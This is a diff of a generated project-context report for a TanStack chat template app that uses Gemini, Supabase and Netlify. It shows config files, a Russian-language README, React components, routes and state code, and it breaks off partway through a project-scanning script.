@@ -1,57 +1,15 @@
 
-# Project Structure
-📄 .env.example
-📁 .vscode/
-└── 📄 settings.json
-📄 app.config.ts
-📄 generate-context-optimized.mjs
-📄 netlify.toml
-📄 package.json
-📄 postcss.config.ts
-📁 public/
-├── 📄 favicon.ico (binary)
-├── 📄 logo192.png (binary)
-├── 📄 logo512.png (binary)
-├── 📄 manifest.json
-└── 📄 robots.txt
-📄 renovate.json
-📁 src/
-├── 📄 api.ts
-├── 📄 client.tsx
-├── 📁 components/
-│   ├── 📄 ChatInput.tsx
-│   ├── 📄 ChatMessage.tsx
-│   ├── 📄 index.ts
-│   ├── 📄 LoadingIndicator.tsx
-│   ├── 📄 SettingsDialog.tsx
-│   ├── 📄 Sidebar.tsx
-│   └── 📄 WelcomeScreen.tsx
-├── 📄 convex.tsx
-├── 📁 providers/
-│   └── 📄 AuthProvider.tsx
-├── 📄 router.tsx
-├── 📁 routes/
-│   ├── 📄 index.tsx
-│   ├── 📄 login.tsx
-│   ├── 📄 signup.tsx
-│   └── 📄 __root.tsx
-├── 📄 routeTree.gen.ts
-├── 📄 sentry.ts
-├── 📄 ssr.tsx
-├── 📁 store/
-│   ├── 📄 hooks.ts
-│   ├── 📄 index.ts
-│   └── 📄 store.ts
-├── 📄 styles.css
-└── 📁 utils/
-    ├── 📄 ai.ts
-    ├── 📄 index.ts
-    └── 📄 supabase.ts
-📄 tsconfig.json
-📄 vite.config.js
+# PROJECT SCOUT REPORT
+Generated: 2025-10-18T11:08:15.596Z
 
+## Detected Tech Stack
+- Framework: Vite + React
+- Bundler: Vite 
+- Styling: unknown
+- Testing: unknown
+- Features: None detected
 
-# Project Configuration
+## Complete Project Structure & Content
 📄 .env.example
 --- BEGIN .env.example ---
 # Server-side AI key (never exposed to browser)
@@ -69,6 +27,57 @@ SENTRY_AUTH_TOKEN=your-sentry-auth-token-here
 
 
 --- END .env.example ---
+
+📄 .gitignore
+--- BEGIN .gitignore ---
+node_modules
+.DS_Store
+dist
+dist-ssr
+*.local
+.vinxi
+.netlify
+.env
+--- END .gitignore ---
+
+📁 .netlify/
+  📁 blobs-serve/
+  📁 functions-internal/
+  📁 plugins/
+    📄 package.json
+    --- BEGIN package.json ---
+{
+  "name": "netlify-local-plugins",
+  "description": "This directory contains Build plugins that have been automatically installed by Netlify.",
+  "version": "1.0.0",
+  "private": true,
+  "author": "Netlify",
+  "license": "MIT",
+  "dependencies": {
+    "neon-buildhooks": "https://37fb2d91-fc5f-402b-b52c-84240e7335fa.netlify.app/packages/buildhooks.tgz"
+  }
+}
+
+    --- END package.json ---
+
+  📁 v1/
+    📁 functions/
+📁 .vscode/
+  📄 settings.json
+  --- BEGIN settings.json ---
+{
+  "files.watcherExclude": {
+    "**/routeTree.gen.ts": true
+  },
+  "search.exclude": {
+    "**/routeTree.gen.ts": true
+  },
+  "files.readonlyInclude": {
+    "**/routeTree.gen.ts": true
+  }
+}
+
+  --- END settings.json ---
 
 📄 app.config.ts
 --- BEGIN app.config.ts ---
@@ -94,7 +103,32 @@ export default defineConfig({
 
 --- END app.config.ts ---
 
-📄 generate-context-optimized.mjs (skipped)
+📄 LICENSE
+--- BEGIN LICENSE ---
+MIT License
+
+Copyright (c) 2025 netlify-templates
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+--- END LICENSE ---
+
 📄 netlify.toml
 --- BEGIN netlify.toml ---
 [template.environment]
@@ -102,35 +136,58 @@ VITE_ANTHROPIC_API_KEY="Add your Anthropic API key here"
 --- END netlify.toml ---
 
 📄 package.json
+--- BEGIN package.json ---
 {
   "name": "tanstack-chat-template",
+  "private": true,
+  "type": "module",
   "scripts": {
-  "start": "vinxi start",
-  "build": "vinxi build",
-  "serve": "vite preview",
-  "dev": "vinxi dev"
-},
-  "dependencies": [
-  "@google/generative-ai",
-  "@sentry/react",
-  "@supabase/supabase-js",
-  "@tailwindcss/postcss",
-  "@tailwindcss/vite",
-  "@tanstack/react-router",
-  "@tanstack/react-start",
-  "@tanstack/react-store",
-  "lucide-react",
-  "react",
-  "react-dom",
-  "react-markdown",
-  "tailwindcss"
-],
-  "devDependencies": [
-  "@vitejs/plugin-react",
-  "typescript",
-  "vite"
-]
+    "start": "vinxi start",
+    "build": "vinxi build",
+    "serve": "vite preview",
+    "dev": "vinxi dev"
+  },
+  "dependencies": {
+    "@google/generative-ai": "^0.24.1",
+    "@sentry/react": "^9.5.0",
+    "@sentry/vite-plugin": "^3.2.2",
+    "@supabase/supabase-js": "^2.75.0",
+    "@tailwindcss/postcss": "^4.0.7",
+    "@tailwindcss/vite": "^4.0.6",
+    "@tanstack/react-router": "^1.114.17",
+    "@tanstack/react-start": "^1.114.19",
+    "@tanstack/react-store": "^0.7.0",
+    "@tanstack/router-devtools": "^1.114.21",
+    "@tanstack/router-plugin": "^1.114.17",
+    "@tanstack/store": "^0.7.0",
+    "@types/uuid": "^10.0.0",
+    "highlight.js": "^11.11.1",
+    "lucide-react": "^0.475.0",
+    "openai": "^6.4.0",
+    "postcss": "^8.5.2",
+    "react": "^19.0.0",
+    "react-dom": "^19.0.0",
+    "react-markdown": "^9.0.1",
+    "rehype-highlight": "^7.0.0",
+    "rehype-raw": "^7.0.0",
+    "rehype-sanitize": "^6.0.0",
+    "tailwindcss": "^4.0.6",
+    "uuid": "^11.1.0",
+    "vinxi": "^0.5.3",
+    "vite-tsconfig-paths": "^5.1.4"
+  },
+  "devDependencies": {
+    "@types/react": "^19.0.8",
+    "@types/react-dom": "^19.0.3",
+    "@vitejs/plugin-react": "^4.3.4",
+    "jsdom": "^26.0.0",
+    "typescript": "^5.7.2",
+    "vite": "^6.2.2",
+    "web-vitals": "^4.2.4"
+  }
 }
+
+--- END package.json ---
 
 📄 postcss.config.ts
 --- BEGIN postcss.config.ts ---
@@ -142,64 +199,284 @@ export default {
 
 --- END postcss.config.ts ---
 
-📄 renovate.json
-// Файл renovate.json (содержимое пропущено для экономии места)
-
-📄 tsconfig.json
-// Файл tsconfig.json (содержимое пропущено для экономии места)
-
-📄 vite.config.js
---- BEGIN vite.config.js ---
-import { defineConfig } from "vite";
-import viteReact from "@vitejs/plugin-react";
-import tailwindcss from "@tailwindcss/vite";
-import { sentryVitePlugin } from "@sentry/vite-plugin";
-
-import { TanStackRouterVite } from "@tanstack/router-plugin/vite";
-
-const basePlugins = [
-  TanStackRouterVite({ autoCodeSplitting: true }), 
-  viteReact(), 
-  tailwindcss(),
-];
-
-// Add Sentry plugin only if auth token is available
-if (process.env.SENTRY_AUTH_TOKEN) {
-  basePlugins.push(
-    sentryVitePlugin({
-      org: "org-name",
-      project: "project-name",
-      authToken: process.env.SENTRY_AUTH_TOKEN,
-    })
-  );
+📁 public/
+  📄 favicon.ico (binary)
+  📄 logo192.png (binary)
+  📄 logo512.png (binary)
+  📄 manifest.json
+  --- BEGIN manifest.json ---
+{
+  "short_name": "TanStack Chat", 
+  "name": "TanStack Chat Template",
+  "icons": [
+    {
+      "src": "favicon.ico",
+      "sizes": "64x64 32x32 24x24 16x16",
+      "type": "image/x-icon"
+    },
+    {
+      "src": "logo192.png",
+      "type": "image/png",
+      "sizes": "192x192"
+    },
+    {
+      "src": "logo512.png",
+      "type": "image/png",
+      "sizes": "512x512"
+    }
+  ],
+  "start_url": ".",
+  "display": "standalone",
+  "theme_color": "#000000",
+  "background_color": "#ffffff"
 }
 
-// https://vitejs.dev/config/
-export default defineConfig({
-  plugins: basePlugins,
-  build: {
-    // Only generate source maps if Sentry is enabled
-    sourcemap: !!process.env.SENTRY_AUTH_TOKEN,
-  },
-});
+  --- END manifest.json ---
 
---- END vite.config.js ---
+  📄 robots.txt
+  --- BEGIN robots.txt ---
+# https://www.robotstxt.org/robotstxt.html
+User-agent: *
+Disallow:
+
+  --- END robots.txt ---
+
+📄 README.md
+--- BEGIN README.md ---
+# AI-чат на TanStack
+
+Чат-приложение с интеграцией Google Gemini и базой данных Supabase. Отлично подходит для быстрого старта проекта с искусственным интеллектом.
+
+**⚡ Посмотреть демо:** [https://tanstack-starter.netlify.app/](https://tanstack-starter.netlify.app/)
+
+[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/StanislavMal/tanstack-template)
+
+## Особенности
+
+- 🤖 Работает с **Google Gemini API**
+- ✨ Поддержка Markdown с подсветкой кода
+- ⚡ Потоковая передача ответов (эффект "печатной машинки")
+- 🔐 Безопасные серверные вызовы (ключ Gemini не попадает в браузер)
+- 💬 Управление диалогами через **Supabase PostgreSQL**
+- 🔑 Управление API-ключами
+- 📱 Адаптивный интерфейс для всех устройств
+- 🎨 Современный UI на Tailwind CSS
+- 🧠 Централизованное управление состоянием через TanStack Store
+
+## Архитектура
+
+- **Фронтенд**: React 19 + Vite 6 + Vinxi
+- **Маршрутизация**: TanStack Router (file-based)
+- **Состояние**: TanStack Store
+- **База данных**: Supabase PostgreSQL
+- **AI-интеграция**: Google Gemini (через серверные функции)
+- **Сборка**: Vite + Vinxi
+- **Стили**: Tailwind CSS 4
+- **Деплой**: Netlify
+
+## Структура проекта
+
+tanstack-template/
+├── public/                  # Статические файлы (иконки, manifest)
+├── src/
+│   ├── api/                 # Серверные функции (Vinxi)
+│   │   └── genAIResponse    # Обработчик запросов к Gemini
+│   ├── components/          # Переиспользуемые компоненты
+│   │   ├── ChatInput.tsx    # Поле ввода сообщения
+│   │   ├── ChatMessage.tsx  # Отображение сообщения
+│   │   ├── Sidebar.tsx      # Боковая панель
+│   │   └── ...
+│   ├── providers/           # Контексты и провайдеры
+│   │   └── AuthProvider.tsx # Авторизация через Supabase
+│   ├── routes/              # Маршруты приложения
+│   │   ├── __root.tsx       # Главный макет
+│   │   ├── index.tsx        # Главная страница
+│   │   └── ...
+│   ├── store/               # Локальное состояние
+│   │   ├── store.ts         # Основной store
+│   │   └── hooks.ts         # Кастомные хуки
+│   ├── utils/               # Вспомогательные функции
+│   │   ├── ai.ts            # Логика взаимодействия с AI
+│   │   └── supabase.ts      # Клиент Supabase
+│   ├── client.tsx           # Точка входа (клиент)
+│   ├── router.tsx           # Конфигурация маршрутизатора
+│   ├── sentry.ts            # Настройка Sentry (опционально)
+│   ├── styles.css           # Глобальные стили
+│   └── app.config.ts        # Конфигурация приложения
+├── .env                     # Переменные окружения (локально)
+├── .env.example             # Шаблон переменных
+├── netlify.toml             # Конфигурация Netlify
+├── package.json             # Зависимости и скрипты
+├── postcss.config.ts        # Конфигурация PostCSS/Tailwind
+├── tsconfig.json            # TypeScript
+└── vite.config.js           # Конфигурация Vite/Vinxi
+```
+
+## Начало работы
+
+### Предварительные требования
+
+- Node.js v20.9+
+- npm или yarn
+- Аккаунт на [Google AI Studio](https://aistudio.google.com/) (для ключа Gemini)
+- Аккаунт на [Supabase](https://supabase.com/) (для базы данных)
+
+### Установка
+
+1. **Клонируйте репозиторий:**
+   ```bash
+   git clone https://github.com/StanislavMal/tanstack-template.git
+   cd tanstack-template
+   ```
+
+2. **Установите зависимости:**
+   ```bash
+   npm install
+   ```
+
+3. **Настройте переменные окружения:**
+   ```bash
+   cp .env.example .env
+   ```
+   
+   Отредактируйте `.env`:
+   ```env
+   # Ключ Gemini (серверный, НЕ попадает в браузер!)
+   GEMINI_API_KEY=ваш_ключ_от_gemini
+   
+   # Supabase (клиентские переменные)
+   VITE_SUPABASE_URL=https://ваш-проект.supabase.co
+   VITE_SUPABASE_ANON_KEY=ваш_anon_key
+   
+   # Sentry (опционально)
+   VITE_SENTRY_DSN=ваш-dsn
+   SENTRY_AUTH_TOKEN=ваш-auth-token
+   ```
+
+   > 🔒 **Важно**: Файл `.env` добавлен в `.gitignore`. Никогда не коммитьте его!
+
+4. **Запустите сервер разработки:**
+   ```bash
+   npm run dev
+   ```
+   Приложение будет доступно по адресу: [http://localhost:3000](http://localhost:3000)
+
+5. **Или используйте Netlify Dev:**
+   ```bash
+   npm install -g netlify-cli
+   netlify dev
+   ```
+   Доступно по: [http://localhost:8888](http://localhost:8888)
+
+## Настройка базы данных (Supabase)
+
+1. Создайте проект на [supabase.com](https://supabase.com/)
+2. Получите URL проекта и anon-ключ
+3. Добавьте их в `.env` как `VITE_SUPABASE_URL` и `VITE_SUPABASE_ANON_KEY`
+4. В `src/providers/AuthProvider.tsx` уже используется `@supabase/supabase-js` — всё готово к работе
+
+## Интеграция с Google Gemini
+
+- Все вызовы к Gemini происходят **на сервере** через `createServerFn`.
+- Ключ `GEMINI_API_KEY` используется только на сервере — это безопасно.
+- Логика находится в `utils/ai.ts` → `genAIResponse`.
+
+## Сборка и деплой
+
+```bash
+# Сборка для production
+npm run build
+
+# Просмотр сборки локально
+npm run serve
+```
+
+После этого вы можете задеплоить проект на Netlify одним кликом (кнопка вверху) или через CLI.
+
+## Лицензия
+
+Проект распространяется под лицензией MIT.
 
 
+### 🛠️ Developer Tools
 
-# Source Code Architecture
-📄 api.ts
---- BEGIN api.ts ---
+Для упрощения анализа и рефакторинга проекта, мы предоставляем специальный скрипт для генерации полного контекста кода.
+
+#### `generate-context.mjs`
+
+Это вспомогательный скрипт, который автоматически собирает ключевую информацию о проекте в один файл.
+
+**Что он делает:**
+1.  Генерирует древовидную структуру проекта (исключая `node_modules`, `.git` и другие служебные папки).
+2.  Собирает содержимое всех TypeScript/JSX/JavaScript файлов из папки `src/`.
+3.  Сохраняет всё в один файл `PROJECT_CONTEXT.md`.
+
+**Как использовать:**
+
+1.  Убедитесь, что установлен `tree-node-cli`:
+    ```bash
+    npm install -g tree-node-cli
+    ```
+
+2.  Запустите скрипт из корня проекта:
+    ```bash
+    node generate-context.mjs
+    ```
+
+3.  После выполнения появится файл `PROJECT_CONTEXT.md`.
+
+4.  Этот файл можно:
+    -   Отправить ИИ-ассистенту для анализа.
+    -   Приложить к задаче в трекере багов.
+    -   Использовать для быстрого обзора проекта при наставничестве.
+
+> 💡 **Зачем это нужно?**  
+> Вместо того чтобы открывать десятки файлов вручную, вы можете сгенерировать один документ, содержащий всю суть вашего кода. Это экономит часы времени и позволяет точно передать состояние проекта.
+
+#### `PROJECT_CONTEXT.md`
+
+Этот файл является результатом работы `generate-context.mjs`. Он не добавляется в систему контроля версий (указан в `.gitignore`), так как генерируется динамически.
+
+**Структура файла:**
+
+# Project Structure
+[результат команды tree]
+
+# Key Files Content
+[содержимое каждого .ts/.tsx/.js файла из src/]
+
+
+---
+
+Хотите адаптировать этот шаблон под свои нужды? Просто замените логику в `utils/ai.ts` или добавьте новые компоненты в `src/components/`.
+
+Удачи в разработке! 🚀
+--- END README.md ---
+
+📄 renovate.json
+--- BEGIN renovate.json ---
+{
+  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
+  "extends": [
+    "local>netlify-templates/renovate-config"
+  ]
+}
+
+--- END renovate.json ---
+
+📁 src/
+  📄 api.ts
+  --- BEGIN api.ts ---
 import {
   createStartAPIHandler,
   defaultAPIFileRouteHandler,
 } from '@tanstack/react-start/api'
 
 export default createStartAPIHandler(defaultAPIFileRouteHandler)
---- END api.ts ---
+  --- END api.ts ---
 
-📄 client.tsx
---- BEGIN client.tsx ---
+  📄 client.tsx
+  --- BEGIN client.tsx ---
 import { hydrateRoot } from 'react-dom/client'
 import { StartClient } from '@tanstack/react-start'
 import * as Sentry from '@sentry/react'
@@ -221,11 +498,11 @@ const AppComponent = process.env.SENTRY_DSN
 
 hydrateRoot(document, <AppComponent router={router} />)
 
---- END client.tsx ---
+  --- END client.tsx ---
 
-📁 components/
-  📄 ChatInput.tsx
-  --- BEGIN ChatInput.tsx ---
+  📁 components/
+    📄 ChatInput.tsx
+    --- BEGIN ChatInput.tsx ---
 import { Send } from 'lucide-react';
 
 interface ChatInputProps {
@@ -277,10 +554,10 @@ export const ChatInput = ({
     </div>
   </div>
 ); 
-  --- END ChatInput.tsx ---
+    --- END ChatInput.tsx ---
 
-  📄 ChatMessage.tsx
-  --- BEGIN ChatMessage.tsx ---
+    📄 ChatMessage.tsx
+    --- BEGIN ChatMessage.tsx ---
 import ReactMarkdown from 'react-markdown'
 import rehypeRaw from 'rehype-raw'
 import rehypeSanitize from 'rehype-sanitize'
@@ -320,20 +597,20 @@ export const ChatMessage = ({ message }: { message: Message }) => (
     </div>
   </div>
 ); 
-  --- END ChatMessage.tsx ---
+    --- END ChatMessage.tsx ---
 
-  📄 index.ts
-  --- BEGIN index.ts ---
+    📄 index.ts
+    --- BEGIN index.ts ---
 export { ChatMessage } from './ChatMessage';
 export { LoadingIndicator } from './LoadingIndicator';
 export { ChatInput } from './ChatInput';
 export { Sidebar } from './Sidebar';
 export { WelcomeScreen } from './WelcomeScreen';
 export { SettingsDialog } from './SettingsDialog'; 
-  --- END index.ts ---
+    --- END index.ts ---
 
-  📄 LoadingIndicator.tsx
-  --- BEGIN LoadingIndicator.tsx ---
+    📄 LoadingIndicator.tsx
+    --- BEGIN LoadingIndicator.tsx ---
 export const LoadingIndicator = () => (
   <div className="px-6 py-6 bg-gradient-to-r from-orange-500/5 to-red-600/5">
     <div className="flex items-start w-full max-w-3xl gap-4 mx-auto">
@@ -370,10 +647,10 @@ export const LoadingIndicator = () => (
     </div>
   </div>
 ); 
-  --- END LoadingIndicator.tsx ---
+    --- END LoadingIndicator.tsx ---
 
-  📄 SettingsDialog.tsx
-  --- BEGIN SettingsDialog.tsx ---
+    📄 SettingsDialog.tsx
+    --- BEGIN SettingsDialog.tsx ---
 // 📄 components/SettingsDialog.tsx
 import { useState, useEffect } from 'react'
 import { PlusCircle, Trash2 } from 'lucide-react'
@@ -536,10 +813,10 @@ export function SettingsDialog({ isOpen, onClose }: SettingsDialogProps) {
     </div>
   )
 }
-  --- END SettingsDialog.tsx ---
+    --- END SettingsDialog.tsx ---
 
-  📄 Sidebar.tsx
-  --- BEGIN Sidebar.tsx ---
+    📄 Sidebar.tsx
+    --- BEGIN Sidebar.tsx ---
 import { PlusCircle, MessageCircle, Trash2, Edit2 } from 'lucide-react';
 
 interface SidebarProps {
@@ -644,10 +921,10 @@ export const Sidebar = ({
     </div>
   </div>
 ); 
-  --- END Sidebar.tsx ---
+    --- END Sidebar.tsx ---
 
-  📄 WelcomeScreen.tsx
-  --- BEGIN WelcomeScreen.tsx ---
+    📄 WelcomeScreen.tsx
+    --- BEGIN WelcomeScreen.tsx ---
 import { Send } from 'lucide-react';
 
 interface WelcomeScreenProps {
@@ -700,10 +977,10 @@ export const WelcomeScreen = ({
     </div>
   </div>
 ); 
-  --- END WelcomeScreen.tsx ---
+    --- END WelcomeScreen.tsx ---
 
-📄 convex.tsx
---- BEGIN convex.tsx ---
+  📄 convex.tsx
+  --- BEGIN convex.tsx ---
 import type { ReactNode } from 'react';
 import { ConvexProvider, ConvexReactClient } from 'convex/react';
 
@@ -723,11 +1000,11 @@ export function ConvexClientProvider({ children }: { children: ReactNode }) {
   // Otherwise, wrap children with ConvexProvider
   return <ConvexProvider client={convex}>{children}</ConvexProvider>;
 }
---- END convex.tsx ---
+  --- END convex.tsx ---
 
-📁 providers/
-  📄 AuthProvider.tsx
-  --- BEGIN AuthProvider.tsx ---
+  📁 providers/
+    📄 AuthProvider.tsx
+    --- BEGIN AuthProvider.tsx ---
 import { createContext, useContext, useEffect, useState } from 'react'
 import { supabase } from '../utils/supabase'
 import type { AuthChangeEvent, Session, User } from '@supabase/supabase-js'
@@ -786,10 +1063,10 @@ export const useAuth = () => {
   }
   return context;
 };
-  --- END AuthProvider.tsx ---
+    --- END AuthProvider.tsx ---
 
-📄 router.tsx
---- BEGIN router.tsx ---
+  📄 router.tsx
+  --- BEGIN router.tsx ---
 import { createRouter as createTanstackRouter } from '@tanstack/react-router'
 
 // Import the generated route tree
@@ -815,11 +1092,11 @@ declare module '@tanstack/react-router' {
   }
 }
 
---- END router.tsx ---
+  --- END router.tsx ---
 
-📁 routes/
-  📄 index.tsx
-  --- BEGIN index.tsx ---
+  📁 routes/
+    📄 index.tsx
+    --- BEGIN index.tsx ---
 // 📄 src/routes/index.tsx
 
 import { createFileRoute, redirect, useNavigate } from '@tanstack/react-router'
@@ -1080,10 +1357,10 @@ function Home() {
     </div>
   )
 }
-  --- END index.tsx ---
+    --- END index.tsx ---
 
-  📄 login.tsx
-  --- BEGIN login.tsx ---
+    📄 login.tsx
+    --- BEGIN login.tsx ---
 import { createFileRoute, useNavigate, Link } from '@tanstack/react-router'
 import { useState } from 'react'
 import { supabase } from '../utils/supabase'
@@ -1148,10 +1425,10 @@ function LoginComponent() {
     </div>
   )
 }
-  --- END login.tsx ---
+    --- END login.tsx ---
 
-  📄 signup.tsx
-  --- BEGIN signup.tsx ---
+    📄 signup.tsx
+    --- BEGIN signup.tsx ---
 import { createFileRoute, useNavigate, Link } from '@tanstack/react-router'
 import { useState } from 'react'
 import { supabase } from '../utils/supabase'
@@ -1220,10 +1497,10 @@ function SignupComponent() {
     </div>
   )
 }
-  --- END signup.tsx ---
+    --- END signup.tsx ---
 
-  📄 __root.tsx
-  --- BEGIN __root.tsx ---
+    📄 __root.tsx
+    --- BEGIN __root.tsx ---
 import {
   createRootRoute,
   Outlet,
@@ -1270,14 +1547,149 @@ function RootDocument({ children }: { children: React.ReactNode }) {
     </html>
   )
 }
-  --- END __root.tsx ---
+    --- END __root.tsx ---
 
-📄 routeTree.gen.ts
-// Автогенерируемый файл TanStack Router
-// Используемые маршруты: 
+  📄 routeTree.gen.ts
+  --- BEGIN routeTree.gen.ts ---
+/* eslint-disable */
 
-📄 sentry.ts
---- BEGIN sentry.ts ---
+// @ts-nocheck
+
+// noinspection JSUnusedGlobalSymbols
+
+// This file was automatically generated by TanStack Router.
+// You should NOT make any changes in this file as it will be overwritten.
+// Additionally, you should also exclude this file from your linter and/or formatter to prevent it from being checked or modified.
+
+// Import Routes
+
+import { Route as rootRoute } from './routes/__root'
+import { Route as SignupImport } from './routes/signup'
+import { Route as LoginImport } from './routes/login'
+import { Route as IndexImport } from './routes/index'
+
+// Create/Update Routes
+
+const SignupRoute = SignupImport.update({
+  id: '/signup',
+  path: '/signup',
+  getParentRoute: () => rootRoute,
+} as any)
+
+const LoginRoute = LoginImport.update({
+  id: '/login',
+  path: '/login',
+  getParentRoute: () => rootRoute,
+} as any)
+
+const IndexRoute = IndexImport.update({
+  id: '/',
+  path: '/',
+  getParentRoute: () => rootRoute,
+} as any)
+
+// Populate the FileRoutesByPath interface
+
+declare module '@tanstack/react-router' {
+  interface FileRoutesByPath {
+    '/': {
+      id: '/'
+      path: '/'
+      fullPath: '/'
+      preLoaderRoute: typeof IndexImport
+      parentRoute: typeof rootRoute
+    }
+    '/login': {
+      id: '/login'
+      path: '/login'
+      fullPath: '/login'
+      preLoaderRoute: typeof LoginImport
+      parentRoute: typeof rootRoute
+    }
+    '/signup': {
+      id: '/signup'
+      path: '/signup'
+      fullPath: '/signup'
+      preLoaderRoute: typeof SignupImport
+      parentRoute: typeof rootRoute
+    }
+  }
+}
+
+// Create and export the route tree
+
+export interface FileRoutesByFullPath {
+  '/': typeof IndexRoute
+  '/login': typeof LoginRoute
+  '/signup': typeof SignupRoute
+}
+
+export interface FileRoutesByTo {
+  '/': typeof IndexRoute
+  '/login': typeof LoginRoute
+  '/signup': typeof SignupRoute
+}
+
+export interface FileRoutesById {
+  __root__: typeof rootRoute
+  '/': typeof IndexRoute
+  '/login': typeof LoginRoute
+  '/signup': typeof SignupRoute
+}
+
+export interface FileRouteTypes {
+  fileRoutesByFullPath: FileRoutesByFullPath
+  fullPaths: '/' | '/login' | '/signup'
+  fileRoutesByTo: FileRoutesByTo
+  to: '/' | '/login' | '/signup'
+  id: '__root__' | '/' | '/login' | '/signup'
+  fileRoutesById: FileRoutesById
+}
+
+export interface RootRouteChildren {
+  IndexRoute: typeof IndexRoute
+  LoginRoute: typeof LoginRoute
+  SignupRoute: typeof SignupRoute
+}
+
+const rootRouteChildren: RootRouteChildren = {
+  IndexRoute: IndexRoute,
+  LoginRoute: LoginRoute,
+  SignupRoute: SignupRoute,
+}
+
+export const routeTree = rootRoute
+  ._addFileChildren(rootRouteChildren)
+  ._addFileTypes<FileRouteTypes>()
+
+/* ROUTE_MANIFEST_START
+{
+  "routes": {
+    "__root__": {
+      "filePath": "__root.tsx",
+      "children": [
+        "/",
+        "/login",
+        "/signup"
+      ]
+    },
+    "/": {
+      "filePath": "index.tsx"
+    },
+    "/login": {
+      "filePath": "login.tsx"
+    },
+    "/signup": {
+      "filePath": "signup.tsx"
+    }
+  }
+}
+ROUTE_MANIFEST_END */
+
+  --- END routeTree.gen.ts ---
+
+  📄 sentry.ts
+  --- BEGIN sentry.ts ---
 import * as Sentry from '@sentry/react';
 
 export function initSentry() {
@@ -1304,10 +1716,10 @@ export function initSentry() {
     environment: import.meta.env.MODE,
   });
 }
---- END sentry.ts ---
+  --- END sentry.ts ---
 
-📄 ssr.tsx
---- BEGIN ssr.tsx ---
+  📄 ssr.tsx
+  --- BEGIN ssr.tsx ---
 import {
   createStartHandler,
   defaultStreamHandler,
@@ -1343,11 +1755,11 @@ export default createStartHandler({
   getRouterManifest,
 })(streamHandler)
 
---- END ssr.tsx ---
+  --- END ssr.tsx ---
 
-📁 store/
-  📄 hooks.ts
-  --- BEGIN hooks.ts ---
+  📁 store/
+    📄 hooks.ts
+    --- BEGIN hooks.ts ---
 // 📄 store/hooks.ts
 
 import { useCallback } from 'react';
@@ -1497,16 +1909,16 @@ export function useConversations() {
     addMessage,
   };
 }
-  --- END hooks.ts ---
+    --- END hooks.ts ---
 
-  📄 index.ts
-  --- BEGIN index.ts ---
+    📄 index.ts
+    --- BEGIN index.ts ---
 export * from './store';
 export * from './hooks'; 
-  --- END index.ts ---
+    --- END index.ts ---
 
-  📄 store.ts
-  --- BEGIN store.ts ---
+    📄 store.ts
+    --- BEGIN store.ts ---
 // 📄 store/store.ts
 import { Store } from '@tanstack/store'
 import type { Message } from '../utils/ai'
@@ -1634,10 +2046,10 @@ export const selectors = {
   getCurrentConversationId: (state: State) => state.currentConversationId,
   getIsLoading: (state: State) => state.isLoading
 }
-  --- END store.ts ---
+    --- END store.ts ---
 
-📄 styles.css
---- BEGIN styles.css ---
+  📄 styles.css
+  --- BEGIN styles.css ---
 @import "tailwindcss";
 @import "highlight.js/styles/github-dark.css";
 
@@ -1872,11 +2284,11 @@ html {
   padding: 0;
   border-radius: 0;
 }
---- END styles.css ---
+  --- END styles.css ---
 
-📁 utils/
-  📄 ai.ts
-  --- BEGIN ai.ts ---
+  📁 utils/
+    📄 ai.ts
+    --- BEGIN ai.ts ---
 // 📄 src/utils/ai.ts
 
 import { createServerFn } from '@tanstack/react-start'
@@ -1973,15 +2385,15 @@ export const genAIResponse = createServerFn({
       return new Response(JSON.stringify({ error: `Failed to get AI response: ${errorMessage}` }), { status: 500 });
     }
   });
-  --- END ai.ts ---
+    --- END ai.ts ---
 
-  📄 index.ts
-  --- BEGIN index.ts ---
+    📄 index.ts
+    --- BEGIN index.ts ---
 export * from './ai'; 
-  --- END index.ts ---
+    --- END index.ts ---
 
-  📄 supabase.ts
-  --- BEGIN supabase.ts ---
+    📄 supabase.ts
+    --- BEGIN supabase.ts ---
 import { createClient } from '@supabase/supabase-js'
 
 const supabaseUrl = import.meta.env.VITE_SUPABASE_URL
@@ -1993,16 +2405,205 @@ if (!supabaseUrl || !supabaseAnonKey) {
 
 // Создаем и экспортируем клиент Supabase
 export const supabase = createClient(supabaseUrl, supabaseAnonKey)
-  --- END supabase.ts ---
+    --- END supabase.ts ---
+
+📄 tanstack-starter-preview.jpg (binary)
+📄 tsconfig.json
+--- BEGIN tsconfig.json ---
+{
+  "include": ["**/*.ts", "**/*.tsx"],
+  "compilerOptions": {
+    "target": "ES2022",
+    "jsx": "react-jsx",
+    "module": "ESNext",
+    "lib": ["ES2022", "DOM", "DOM.Iterable"],
+    "types": ["vite/client"],
+
+    /* Bundler mode */
+    "moduleResolution": "bundler",
+    "allowImportingTsExtensions": true,
+    "verbatimModuleSyntax": true,
+    "noEmit": true,
+
+    /* Linting */
+    "skipLibCheck": true,
+    "strict": true,
+    "noUnusedLocals": true,
+    "noUnusedParameters": true,
+    "noFallthroughCasesInSwitch": true,
+    "noUncheckedSideEffectImports": true
+  }
+}
+
+--- END tsconfig.json ---
+
+📄 universal-context-scout.mjs
+--- BEGIN universal-context-scout.mjs ---
+// universal-context-scout.mjs
+import fs from 'fs';
+import path from 'path';
+
+// МИНИМАЛЬНЫЕ исключения - собираем ВСЁ для анализа
+const IGNORE_PATTERNS = [
+  'node_modules',
+  '.git', 
+  'dist',
+  'build',
+  '.cache',
+  '.env',
+  'package-lock.json',
+  'yarn.lock',
+  'generate-context.mjs',
+  'PROJECT_CONTEXT.md'
+];
+
+function detectTechStack() {
+  const stack = {
+    framework: 'unknown',
+    bundler: 'unknown',
+    styling: 'unknown',
+    testing: 'unknown',
